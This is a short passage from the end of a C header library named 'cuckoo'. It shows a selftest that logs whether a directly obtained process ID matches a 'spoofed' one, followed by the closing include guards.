        CU_LOG("selftest: mismatch direct=%lu spoofed=%lu\n",
               (unsigned long)direct, (unsigned long)spoofed);
        return 4;
    }
    CU_LOG("selftest: ok (pid=%lu)\n", (unsigned long)direct);
    return 0;
}

#ifdef __cplusplus
}
#endif

#endif /* CUCKOO_IMPLEMENTATION */
#endif /* CUCKOO_H_INCLUDED */
